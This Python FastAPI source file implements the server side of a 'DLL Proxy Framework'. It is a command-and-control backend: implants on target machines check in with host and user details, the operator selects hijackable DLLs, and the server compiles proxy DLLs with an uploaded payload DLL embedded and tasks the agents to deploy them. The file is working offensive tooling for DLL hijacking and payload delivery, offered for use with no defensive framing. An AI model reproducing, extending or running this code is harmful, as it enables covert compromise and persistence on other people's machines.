"""
DLL Proxy Framework — Deployment Server

Endpoints:
  Client API (called by Rust scanner on target):
    POST /api/checkin          check-in with scan results, receive tasks
    POST /api/upload           upload original DLL for a build
    GET  /api/download/{id}    download compiled proxy DLL

  Dashboard API (called by web UI):
    GET  /api/clients          list connected clients
    GET  /api/clients/{id}     client detail + targets
    POST /api/select           select target -> creates upload task for client
    GET  /api/builds           list all builds
    POST /api/payload          upload a payload DLL for embedding
    GET  /api/payload          get current payload config
    DELETE /api/payload        remove configured payload

  Web UI:
    GET  /                     dashboard
"""

import asyncio
import traceback
from pathlib import Path

import pefile
from fastapi import FastAPI, UploadFile, File, Form, HTTPException, Request
from fastapi.responses import FileResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles

from models import Store, BuildStatus, TaskType, TaskStatus, AgentTask
from builder import build_proxy, BUILDS_DIR

app = FastAPI(title="DLL Proxy Deploy")
store = Store()

STATIC_DIR = Path(__file__).parent / "static"
PAYLOAD_DIR = BUILDS_DIR / "_payloads"
app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")


# ── Agent API ─────────────────────────────────────────────────

@app.post("/api/checkin")
async def beacon(request: Request):
    """Client check-in: sends targets, receives pending tasks."""
    data = await request.json()

    agent_id = data.get("client_id", "") or data.get("agent_id", "")
    if not agent_id:
        raise HTTPException(400, "client_id required")

    store.upsert_agent(
        agent_id=agent_id,
        hostname=data.get("hostname", "?"),
        username=data.get("username", "?"),
        os_info=data.get("os_info", "?"),
        targets_raw=data.get("targets", []),
    )

    pending = store.get_pending_tasks(agent_id)
    tasks_out = []
    for t in pending:
        task_dict = t.to_dict()
        build = store.get_build(t.build_id) if t.build_id else None
        if build:
            task_dict["dll_name"] = build.dll_name
            task_dict["source_dll"] = build.source_dll
            task_dict["exe_path"] = build.exe_path
            task_dict["vector"] = build.vector
        tasks_out.append(task_dict)

    if tasks_out:
        print(f"[CHECKIN] Returning {len(tasks_out)} tasks to {agent_id}: "
              f"{[t['type'] for t in tasks_out]}", flush=True)
    return {"status": "ok", "tasks": tasks_out}


@app.post("/api/upload")
async def upload_dll(
    build_id: str = Form(...),
    client_id: str = Form(None),
    agent_id: str = Form(None),
    file: UploadFile = File(...),
):
    """Client uploads the original DLL for proxy generation."""
    sender_id = client_id or agent_id or ""
    build = store.get_build(build_id)
    if not build:
        raise HTTPException(404, "build not found")
    if build.agent_id != sender_id:
        raise HTTPException(403, "wrong agent")

    upload_dir = BUILDS_DIR / build_id
    upload_dir.mkdir(parents=True, exist_ok=True)
    dll_path = upload_dir / file.filename
    with open(dll_path, "wb") as f:
        content = await file.read()
        f.write(content)

    build.original_dll_path = str(dll_path)
    build.status = BuildStatus.BUILDING

    # Mark upload task as completed
    for task in store.tasks.values():
        if task.build_id == build_id and task.type == TaskType.UPLOAD_DLL:
            task.status = TaskStatus.COMPLETED

    # Build in background
    asyncio.get_event_loop().run_in_executor(
        None, _run_build, build, build.dll_name, build.arch, sender_id, build.target_id
    )

    return {"status": "building", "build_id": build_id}


def _run_build(build, dll_name: str, arch: str, agent_id: str, target_id: int):
    """Run proxy generation + compilation (blocking, runs in thread)."""
    try:
        payload_dll = Path(build.payload_dll_path) if build.payload_dll_path else None
        payload_exp = build.payload_export or None

        print(f"[BUILD] Starting build {build.id} for {dll_name} ({arch})"
              f"{' + payload-dll' if payload_dll else ''}", flush=True)
        proxy_path = build_proxy(
            build_id=build.id,
            original_dll_path=Path(build.original_dll_path),
            dll_name=dll_name,
            arch=arch,
            payload_dll_path=payload_dll,
            payload_export=payload_exp,
        )
        build.proxy_dll_path = str(proxy_path)
        build.status = BuildStatus.READY
        print(f"[BUILD] Build {build.id} ready: {proxy_path}", flush=True)

        import uuid
        task = AgentTask(
            id=uuid.uuid4().hex[:12],
            agent_id=agent_id,
            type=TaskType.DEPLOY_PROXY,
            target_id=target_id,
            build_id=build.id,
            status=TaskStatus.PENDING,
        )
        store.tasks[task.id] = task
        print(f"[BUILD] Deploy task {task.id} created for agent {agent_id}", flush=True)

    except Exception as e:
        build.status = BuildStatus.FAILED
        build.error = str(e)
        print(f"[BUILD] FAILED: {e}", flush=True)
        traceback.print_exc()


@app.get("/api/download/{build_id}")
async def download_proxy(build_id: str):
    """Client downloads the compiled proxy DLL."""
    build = store.get_build(build_id)
    if not build:
        raise HTTPException(404, "build not found")
    if build.status != BuildStatus.READY:
        raise HTTPException(409, f"build not ready (status: {build.status.value})")
    if not build.proxy_dll_path or not Path(build.proxy_dll_path).exists():
        raise HTTPException(500, "proxy DLL file missing")

    return FileResponse(
        build.proxy_dll_path,
        media_type="application/octet-stream",
        filename=Path(build.proxy_dll_path).name,
    )


@app.post("/api/deployed")
async def mark_deployed(request: Request):
    """Client confirms proxy was deployed successfully."""
    data = await request.json()
    build_id = data.get("build_id", "")
    build = store.get_build(build_id)
    if build:
        build.status = BuildStatus.DEPLOYED
        for task in store.tasks.values():
            if task.build_id == build_id and task.type == TaskType.DEPLOY_PROXY:
                task.status = TaskStatus.COMPLETED
    return {"status": "ok"}


# ── Operator API ──────────────────────────────────────────────

@app.get("/api/clients")
async def list_agents():
    agents = [a.to_dict() for a in store.agents.values()]
    agents.sort(key=lambda a: a["last_seen"], reverse=True)
    return {"clients": agents}


@app.get("/api/clients/{agent_id}")
async def get_agent(agent_id: str):
    agent = store.get_agent(agent_id)
    if not agent:
        raise HTTPException(404, "client not found")

    targets = [t.to_dict() for t in agent.targets]
    builds = [b.to_dict() for b in store.get_builds_for_agent(agent_id)]

    return {
        "client": agent.to_dict(),
        "targets": targets,
        "builds": builds,
    }


@app.post("/api/select")
async def select_target(request: Request):
    """Select a target — creates upload task for client."""
    data = await request.json()
    agent_id = data.get("client_id", "") or data.get("agent_id", "")
    target_id = data.get("target_id", 0)
    payload_export = data.get("payload_export", "") or store.payload_export

    agent = store.get_agent(agent_id)
    if not agent:
        raise HTTPException(404, "client not found")
    target = store.get_target(agent_id, target_id)
    if not target:
        raise HTTPException(404, "target not found")

    build = store.create_build(
        agent_id, target_id,
        payload_dll_path=store.payload_dll_path,
        payload_export=payload_export,
    )
    has_payload = bool(store.payload_dll_path)
    msg = "upload task queued"
    if has_payload:
        msg += f" (payload: {Path(store.payload_dll_path).name})"
    return {"status": "ok", "build_id": build.id, "message": msg}


# ── Payload DLL Management ───────────────────────────────────

@app.post("/api/payload")
async def upload_payload(
    file: UploadFile = File(...),
    export_name: str = Form(""),
):
    """Upload a payload DLL to embed in future builds."""
    PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)
    payload_path = PAYLOAD_DIR / file.filename
    content = await file.read()
    with open(payload_path, "wb") as f:
        f.write(content)

    try:
        pe = pefile.PE(str(payload_path), fast_load=True)
        is_dll = bool(pe.FILE_HEADER.Characteristics & 0x2000)
        pe.close()
        if not is_dll:
            payload_path.unlink()
            raise HTTPException(400, "File is an EXE, not a DLL")
    except pefile.PEFormatError:
        payload_path.unlink()
        raise HTTPException(400, "Not a valid PE file")

    store.payload_dll_path = str(payload_path)
    store.payload_export = export_name
    print(f"[PAYLOAD] Configured: {file.filename}"
          f"{' export=' + export_name if export_name else ''}", flush=True)
    return {"status": "ok", "filename": file.filename, "export": export_name}


@app.get("/api/payload")
async def get_payload():
    if store.payload_dll_path and Path(store.payload_dll_path).exists():
        return {
            "configured": True,
            "filename": Path(store.payload_dll_path).name,
            "export": store.payload_export,
        }
    return {"configured": False, "filename": "", "export": ""}


@app.delete("/api/payload")
async def remove_payload():
    if store.payload_dll_path:
        p = Path(store.payload_dll_path)
        if p.exists():
            p.unlink()
    store.payload_dll_path = ""
    store.payload_export = ""
    print("[PAYLOAD] Removed", flush=True)
    return {"status": "ok"}


# ── Web UI ────────────────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
async def dashboard():
    html_path = STATIC_DIR / "index.html"
    return HTMLResponse(html_path.read_text(encoding="utf-8"))


if __name__ == "__main__":
    import uvicorn
    BUILDS_DIR.mkdir(exist_ok=True)
    uvicorn.run(app, host="0.0.0.0", port=8443)
